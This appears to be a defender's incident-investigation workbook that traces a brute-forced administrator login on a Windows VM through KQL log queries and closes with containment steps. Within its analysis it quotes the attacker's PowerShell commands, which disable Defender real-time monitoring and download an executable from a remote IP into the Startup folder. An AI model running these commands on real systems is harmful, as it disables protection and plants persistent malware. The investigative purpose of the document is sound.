## 🔐 Workbook 1 — Inbound Authentication

This workbook investigates **remote authentication activity** against virtual machines in the environment.

The goal is to identify:

* Where login attempts originate
* Successful vs. failed logins
* Targeted virtual machines
* Accounts being targeted

---

## Inbound Authentication Overview

### KQL Query

```kusto
DeviceLogonEvents
| where RemoteIPType == "Public"
| where isnotempty(RemoteIP)
| where LogonType in ("Network", "RemoteInteractive")
| extend geo = geo_info_from_ip_address(RemoteIP)
| extend Latitude = toreal(geo.latitude),
         Longitude = toreal(geo.longitude),
         Country = tostring(geo.country),
         City = tostring(geo.city)
| where isnotempty(Latitude) and isnotempty(Longitude)
| summarize Attempts = count(),
            Successes = countif(ActionType == "LogonSuccess"),
            Failures = countif(ActionType == "LogonFailed"),
            TargetedDevices = dcount(DeviceName),
            Accounts = make_set(AccountName, 25)
    by RemoteIP, Country, City, Latitude, Longitude
| extend MapLabel = strcat(RemoteIP, " (", Country, ") — ", Successes, " success / ", Attempts, " total")
| project Latitude, Longitude, MapLabel, Attempts, Successes, Failures,
          TargetedDevices, RemoteIP, Country, City, Accounts
| order by Successes desc, Attempts desc
```

### Authentication Map

<p align="center">
  <img src="https://i.imgur.com/QgLpUwg.png" width="1200" alt="Inbound Authentication Overview">
</p>

The map displays the geographic origin of remote login attempts.

* 🔴 **Red** — No or very few successful logins
* 🟠/🟡 **Orange/Yellow** — Some successful logins
* 🟢 **Green** — Higher number of successful logins

Since the environment operates in the **United States**, successful authentication from unexpected foreign locations was prioritized for investigation.

---

## Data Analysis

### 🔴 Potential Brute-Force Activity

<p align="center">
  <img src="https://i.imgur.com/kIMPU4V.png" width="1200" alt="Potential Brute-Force Activity">
</p>

Three IP addresses generated the highest number of failed logins:

| Source                | Attempts | Result     |
| --------------------- | -------: | ---------- |
| 🇷🇺 `178.57.110.29`  |      368 | All Failed |
| 🇺🇸 `48.217.82.109`  |      153 | All Failed |
| 🇵🇦 `45.227.254.151` |      119 | All Failed |

The repeated login attempts against multiple accounts and systems indicate **potential brute-force activity**.

**No successful logins were observed from these IP addresses.**

---

### 🟢 Suspicious Successful Login

The IP **`112.133.200.242` (India)** stood out because it successfully authenticated to the environment.

| Finding        | Result                     |
| -------------- | -------------------------- |
| Total Attempts | **72**                     |
| Successful     | **33**                     |
| Failed         | **39**                     |
| Target VM      | `win-server-2026.corp.com` |
| Account        | `administrator`            |

<p align="center">
  <img src="https://imgur.com/xtNFPKc.png" width="1200" alt="Successful Login Investigation">
</p>

<p align="center">
  <img src="https://i.imgur.com/gSdL9oD.png" width="1200" alt="Successful Login Investigation">
</p>

This activity was selected for deeper investigation.

---

## Part 1 — Authentication Timeline

I filtered the authentication logs specifically for **`112.133.200.242`**.

```kusto
DeviceLogonEvents
| where RemoteIP == "112.133.200.242"
| project Timestamp, DeviceName, AccountName, ActionType, LogonType, RemoteIP
| order by Timestamp asc
```

<p align="center">
  <img src="https://i.imgur.com/Jms1Qxi.png" width="1200" alt="Authentication Timeline">
</p>

### First Attempt

**6:28:27 PM**

* Source: `112.133.200.242`
* Account: `administrator`
* Target: `win-server-2026.corp.com`
* Result: **Failed**

<p align="center">
  <img src="https://i.imgur.com/2W3IOXy.png" width="1200" alt="Authentication Investigation">
</p>

### First Successful Login

**6:38:04 PM**

Approximately **9 minutes after the failed login activity began**, the attacker successfully authenticated as `administrator`.

This marks the beginning of the **post-compromise investigation**.

---

# Part 2 — Post-Compromise Investigation

`DeviceProcessEvents` was used to determine what occurred immediately after the successful login.

```kusto
DeviceProcessEvents
| where DeviceName == "win-server-2026.corp.com"
| where Timestamp >= datetime(8/11/26 18:38:04)
| where AccountName == "administrator"
| project Timestamp, DeviceName, AccountName,
          FileName, ProcessCommandLine,
          InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp asc
```

---

### 1. Remote Command Execution — 6:38:04 PM

Immediately after authentication, **`WinrsHost.exe` spawned `cmd.exe`**.

This indicates remote command execution began on the VM.

![Remote Command Execution](https://i.imgur.com/bAkf7Za.png)

---

### 2. System Reconnaissance — 6:38:11–6:38:18 PM

The attacker performed several discovery and preparation actions:

* Inspected the Windows Startup folder
* Identified the operating system
* Created `C:\users\Migration`
* Checked Microsoft Defender settings

![Startup Folder](https://imgur.com/dRm4bl7.png)

```powershell
Get-ChildItem 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\'
```

![Operating System](https://imgur.com/hTWmSPI.png)

![Migration Directory](https://imgur.com/7s2zHBN.png)

```powershell
New-Item -Path "C:\users\Migration" -ItemType Directory
```

![Defender Settings](https://imgur.com/gn3LRq1.png)

```powershell
Get-MpPreference | fl DisableRealtimeMonitoring, ExclusionPath
```

---

### 3. Microsoft Defender Tampering — 6:38:21–6:38:24 PM

PowerShell was used to **disable Microsoft Defender real-time monitoring**.

```powershell
Set-MpPreference -DisableRealtimeMonitoring $True
```

![Microsoft Defender Tampering](https://imgur.com/8I92nGm.png)

---

### 4. Payload Download — 6:38:39 PM

PowerShell downloaded **`MicrosoftPrt.exe`** from:

`77.110.114.53`

The executable was placed inside the Windows Startup directory.

```powershell
(new-object System.Net.WebClient).DownloadFile(
'http://77.110.114.53/MicrosoftPrt.exe',
'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\MicrosoftPrt.exe'
)
```

![Payload Download](https://imgur.com/IQfbgUP.png)

Placing the executable in the Startup directory allows it to run when a user logs in.

---

### 5. Persistence Established — 6:39:00 PM

`Wmiic.exe` was used to install a service named **`WMServices`**.

The service was configured to execute **`svchosl.exe`**, establishing persistence on the VM.

![Persistence Established](https://imgur.com/SD8ORHb.png)

---

## Attack Timeline

1. **6:38:04 PM** — Successful administrator authentication
2. **6:38:04 PM** — Remote command execution
3. **6:38:11–6:38:18 PM** — System reconnaissance
4. **6:38:21–6:38:24 PM** — Microsoft Defender tampering
5. **6:38:39–6:38:50 PM** — Payload downloads
6. **6:39:00 PM** — Persistence established

---

# Part 3 — Incident Response

### Containment

* Isolate `win-server-2026.corp.com`
* Block `112.133.200.242` and `77.110.114.53`
* Disable/reset the compromised `administrator` account

### Eradication

* Remove malicious files
* Remove the `WMServices` service
* Remove unauthorized Defender exclusions
* Re-enable Defender real-time monitoring

### Recovery

* Verify persistence has been removed
* Rebuild or restore the VM from a trusted state if necessary
* Validate the system before returning it to the network

